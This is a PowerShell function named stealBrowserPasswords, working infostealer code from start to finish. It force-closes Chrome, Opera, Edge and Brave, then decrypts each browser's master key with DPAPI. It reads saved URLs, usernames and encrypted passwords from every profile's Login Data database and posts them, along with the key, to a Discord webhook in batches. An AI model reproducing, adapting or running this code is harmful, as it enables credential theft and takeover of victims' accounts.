function stealBrowserPasswords() {
    # class to interact with SQLite databases using
    Add-Type @"
using System;
using System.Runtime.InteropServices;
public class WinSQLite3
{
    const string dll = "winsqlite3";
    [DllImport(dll, EntryPoint="sqlite3_open")]
    public static extern IntPtr Open([MarshalAs(UnmanagedType.LPStr)] string filename, out IntPtr db);
    [DllImport(dll, EntryPoint="sqlite3_prepare16_v2")]
    public static extern IntPtr Prepare2(IntPtr db, [MarshalAs(UnmanagedType.LPWStr)] string sql, int numBytes, out IntPtr stmt, IntPtr pzTail);
    [DllImport(dll, EntryPoint="sqlite3_step")]
    public static extern IntPtr Step(IntPtr stmt);
    [DllImport(dll, EntryPoint="sqlite3_column_text16")]
    static extern IntPtr ColumnText16(IntPtr stmt, int index);
    [DllImport(dll, EntryPoint="sqlite3_column_bytes")]
    static extern int ColumnBytes(IntPtr stmt, int index);
    [DllImport(dll, EntryPoint="sqlite3_column_blob")]
    static extern IntPtr ColumnBlob(IntPtr stmt, int index);
    public static string ColumnString(IntPtr stmt, int index)
    { 
        return Marshal.PtrToStringUni(WinSQLite3.ColumnText16(stmt, index));
    }
    public static byte[] ColumnByteArray(IntPtr stmt, int index)
    {
        int length = ColumnBytes(stmt, index);
        byte[] result = new byte[length];
        if (length > 0)
            Marshal.Copy(ColumnBlob(stmt, index), result, 0, length);
        return result;
    }
    [DllImport(dll, EntryPoint="sqlite3_errmsg16")]
    public static extern IntPtr Errmsg(IntPtr db);
    public static string GetErrmsg(IntPtr db)
    {
        return Marshal.PtrToStringUni(Errmsg(db));
    }
}
"@


    function dumpChromium($browserName, $userDataPath) {
        
        # browserName = chrome, opera, name of process
        #pathName = \Google\Chrome\User Data, \Opera Software\Opera Stable
        $ErrorActionPreference = 'SilentlyContinue'
        try {
            Stop-Process -Name $browserName
            Add-Type -AssemblyName System.Security

            if ($browserName -eq "opera") {
                $browser_path = $env:APPDATA + $userDataPath
            }
            else {
                $browser_path = $env:LOCALAPPDATA + $userDataPath
            }
            $query = "SELECT origin_url, username_value, password_value FROM logins WHERE blacklisted_by_user = 0"

            $secret = Get-Content -Raw -Path $( -join ($browser_path, "\Local State")) | ConvertFrom-Json
            $secretkey = $secret.os_crypt.encrypted_key

            $cipher = [Convert]::FromBase64String($secretkey)

            $key = [Convert]::ToBase64String([System.Security.Cryptography.ProtectedData]::Unprotect($cipher[5..$cipher.length], $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser))



            $browser_profiles = Get-ChildItem -Path $browser_path | Where-Object { $_.Name -match "(Profile [0-9]|Default)" } | % { $_.FullName }



            foreach ($user_profile in $browser_profiles) {
                $dbH = 0
                if ([WinSQLite3]::Open($( -join ($user_profile, "\Login Data")), [ref] $dbH) -ne 0) {
                    Write-Host "Failed to open!"
                    [WinSQLite3]::GetErrmsg($dbh)
                
                }

                $stmt = 0
                if ([WinSQLite3]::Prepare2($dbH, $query, -1, [ref] $stmt, [System.IntPtr]0) -ne 0) {
                    Write-Host "Failed to prepare!"
                    [WinSQLite3]::GetErrmsg($dbh)
               
                }

                # Initialize an array to store all records
                $records = @{}
                $i = 0
                while ([WinSQLite3]::Step($stmt) -eq 100) {
                
                    try {
                        $url = [WinSQLite3]::ColumnString($stmt, 0)
                        $username = [WinSQLite3]::ColumnString($stmt, 1)
                        $encryptedPassword = [Convert]::ToBase64String([WinSQLite3]::ColumnByteArray($stmt, 2))

                        # Store the extracted data in a structured object
                        $record = @{
                            url      = $url
                            username = $username
                            password = $encryptedPassword
                            key      = $key
                        }
                        $i++
                        # Add record to the list
                        $jsonRecord = $record | ConvertTo-Json -Depth 10
                        $records.Add($i.ToString(), $jsonRecord)
                    }
                    catch {
                        Write-Host $_.Exception.Message -ForegroundColor Red
                    }
                

                
                }
                # Check if there are any records before sending the request
                if ($records.Count -gt 0) {
                    try {
                        $batchSize = 5
                        $prepare = @{}
                        $count = 0
                        $apiCallCount = 0
                        $records.GetEnumerator() | ForEach-Object {
                            $prepare.Add($_.Key, $_.Value)
                            $count++
            
                            # Send when 5 records are collected because of the limits of the API (https://discord.com/developers/docs/resources/webhook)
                            if ($count -eq $batchSize) {
                                # Convert the collected records to JSON
                                $content = ConvertTo-Json -InputObject $prepare -Depth 10

                                # Construct the final payload
                                $payload = @{ content = $content } | ConvertTo-Json -Depth 10
                
                                # Define webhook URL
                                $hookUrl = "https://discord.com/api/webhooks/XXXXXXXXXX"
                                if ($payload.Length -gt 1900) {
                                    $payload = @{ content = "Data too long, unable to send." } | ConvertTo-Json -Depth 10
                                } 
                                Write-Host $payload
                                Invoke-RestMethod -Uri $hookUrl -Method Post -Body $payload -ContentType "application/json"
                                $apiCallCount++
                                # Clear the hashtable and reset counter
                                $prepare.Clear()
                                $count = 0

                                if ($apiCallCount -ge 6) {
                                    Start-Sleep -Seconds 1 # with less you will get `too much requests at second`
                                    $apiCallCount = 0
                                }
                            }
                        }
        
                        # Send any remaining records
                        if ($prepare.Count -gt 0) {
                            $content = ConvertTo-Json -InputObject $prepare -Depth 10
                            $payload = @{ content = $content } | ConvertTo-Json -Depth 10
                            Write-Host $payload
                            Invoke-RestMethod -Uri $hookUrl -Method Post -Body $payload -ContentType "application/json"
                        }
                    }
                    catch {
                        Write-Host $_.Exception.Message -ForegroundColor Red
                    }
                }



            }
        }
        catch [Exception] {
            Write-Host $_.Exception.Message -ForegroundColor Red
        }


    }

    dumpChromium "chrome" "\Google\Chrome\User Data"

    dumpChromium "opera" "\Opera Software\Opera Stable"

    dumpChromium "msedge" "\Microsoft\Edge\User Data"

    dumpChromium "brave" "\BraveSoftware\Brave-Browser\User Data"
}

